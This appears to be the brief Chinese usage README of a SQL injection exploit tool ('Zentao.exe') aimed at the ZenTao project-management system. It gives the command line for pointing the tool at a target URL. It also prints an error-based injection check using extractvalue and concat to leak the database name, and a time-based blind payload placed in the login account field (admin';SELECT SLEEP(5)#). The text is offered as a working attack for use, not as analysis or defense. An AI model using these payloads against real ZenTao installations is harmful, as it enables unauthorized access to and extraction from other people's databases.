### 使用说明
##### usage: ./Zentao.exe -u url (加http://)
##### 禅道当前数据库都是zentao,判断注入条件 extractvalue(1,concat(0x7e,(database()),0x7e) == zentao 盲注payload account=admin';SELECT SLEEP(5)#